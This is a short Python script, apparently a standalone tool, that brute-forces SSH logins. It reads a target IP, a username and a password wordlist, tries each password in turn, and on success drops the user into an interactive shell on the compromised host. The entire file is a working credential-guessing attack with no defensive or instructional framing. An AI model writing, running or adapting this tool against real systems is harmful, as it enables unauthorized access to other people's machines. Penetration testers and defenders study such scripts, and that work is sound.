#!/usr/bin/python3

from pexpect import pxssh
import argparse
import time

from p_bar import *

from ssh_connect import *

import color

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip", help="Specify Target ip")
	parser.add_argument("user", help="Specify Target User")
	parser.add_argument("file", help="Specify wordlist file")

	args = parser.parse_args()

	if args.ip and args.user and args.file:

		with open(args.file, 'r') as lines:

				startTime = time.time()
				
				for line in lines: # reading a line from lines in file
					passwd = line.strip("\r\n")

					print(color.color_obj.WHITE+"[*] Testing: ", args.user+":"+str(passwd)+color.color_obj.ENDC)
					
					#p_bar() #Progressbar

					conn = connect(args.ip, args.user, passwd) # ssh connect

					if conn:

						totalTime = time.time() - startTime
						totalTime = '%.3f'%totalTime

						print(color.color_obj.PURPLE+f"\n[+] Process Completed\n[+] Time Taken : {totalTime}s\n"+color.color_obj.ENDC)

						print(color.color_obj.GREEN+'''[+] SSH connected!!, Type: exit to quit: 
						'''+color.color_obj.ENDC)

						command = input(args.user+'@'+args.ip+':$ ')
						while command != 'exit':
							conn.sendline(command)
							conn.prompt()
							print(conn.before.decode("utf-8"))
							command = input(args.user+'@'+args.ip+':$ ')
							
						else:
							print(color.color_obj.YEL+'''
Bye!
							'''+color.color_obj.ENDC)
						exit(0)

	else:
		print(parser.usage)
		exit(0)



if __name__ == '__main__': 

	main()
